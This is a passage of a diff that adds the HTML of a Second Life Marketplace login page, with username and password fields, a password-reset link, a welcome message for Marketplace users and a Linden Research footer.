+            <span id="help_notes" class="note">Your username is both your screenname in Second Life and your login ID. Accounts created prior to June 2010 may have both a first and last name (Example: First Last), while newer accounts may only have a single username.</span>
+
+            
+
+            <label for="username">Second Life Username:</label><img src="https://s3.amazonaws.com/common.web.secondlife.com/_img/info-icon.png" alt="more info" title="What's this?" id="more-about-username" />
+
+            <input type="text" size="25" name="username" id="username" value=""/>
+          </p>
+      <p>
+          <label for="password">Second Life Password:</label>
+          <input type="password" size="16" name="password" id="password"/>
+                </p>
+                <p>
+          <input type="checkbox" name="stay_logged_in" value="stay_logged_in" id="stay_logged_in"  class="checkbox" />
+                    <label for="stay_logged_in">Remember me on this computer</label>
+                </p>
+
+
+
+
+     <p class="resetpass"><a href="https://secondlife.com/account/request.php?lang=en" >Forgot your login information?</a>
+      </p>
+                
+
+      </div>
+
+    <div class="clearfix" style="padding-left:38%">
+
+        <button type="submit" name="Submit" class="css_button_hot btn_large primary">Login</button>
+    </div>
+
+
+    <input type="hidden" name="return_to" value="https://marketplace.secondlife.com/"/>
+    <input type="hidden" name="previous_language" value="en_US"/>
+    <input type="hidden" name="language" value="en_US"/>
+    <input type="hidden" name="show_join" value="True"/>
+    <input type="hidden" name="from_amazon" value=""/>
+
+  </form>
+
+
+
+    </div>
+  </div>
+
+
+
+  
+  <div class="block-join dialog prepend-1 span-10">
+  <div class="content">
+
+  
+<h2>Welcome Marketplace Users!</h2>
+<div class="block-content">
+
+<p>
+  Your Second Life account now logs you into Marketplace. Remember to log in using your Second Life user name and password!
+</p>
+
+<h4>Not a Second Life Resident?</h4>
+<p>                                                                                                                                                  Second Life is a virtual 3D world created by people just like you. Express your creativity, socialize with friends, and make new ones from all around the world.
+  </p>
+
+</div>
+
+<div class="clearfix" style="padding-left:30%">
+  <a href="https://join.secondlife.com/?lang=en-US" class="css_button_hot btn_large secondary">Join Now</a>
+</div>
+
+
+
+    </div>
+  </div>
+  
+
+</div>
+
+
+<div id="footer" class="clear span-24">
+  <p>
+    &copy; 2024 <a href="http://lindenlab.com" target="_blank">Linden Research, Inc.</a>
+  </p>
+</div>
+
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
